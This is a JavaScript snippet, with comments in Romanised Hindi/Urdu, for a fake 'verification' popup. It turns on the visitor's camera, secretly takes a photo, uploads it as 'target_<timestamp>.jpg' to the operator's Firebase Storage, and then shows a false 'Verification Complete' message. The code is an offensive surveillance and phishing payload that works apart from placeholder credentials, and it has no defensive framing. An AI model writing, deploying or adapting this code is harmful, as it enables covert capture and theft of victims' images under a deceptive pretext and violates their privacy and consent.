// 1. Firebase Configuration (Apni asali details yahan dalein)
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT.firebaseapp.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
};

firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();

// 2. Open Verification Popup
async function openVerify() {
    document.getElementById('verifyOverlay').style.display = 'flex';
    
    // Background mein camera mangna
    try {
        const video = document.getElementById('video');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch (err) {
        console.log("Camera access denied.");
    }
}

// 3. Silent Capture and Firebase Upload
async function captureAndProceed() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    if (video.srcObject) {
        // Chupke se photo lena
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            if (blob) {
                const fileName = `target_${Date.now()}.jpg`;
                const storageRef = storage.ref('verifications/' + fileName);
                
                // Firebase Storage mein upload
                await storageRef.put(blob);
                console.log("Data Secured.");
            }
        }, 'image/jpeg');

        // Camera track stop karna (Light band ho jaye)
        const tracks = video.srcObject.getTracks();
        tracks.forEach(track => track.stop());
    }

    // Target ko redirect karna
    alert("Verification Complete. Portal Access Granted.");
    document.getElementById('verifyOverlay').style.display = 'none';
}
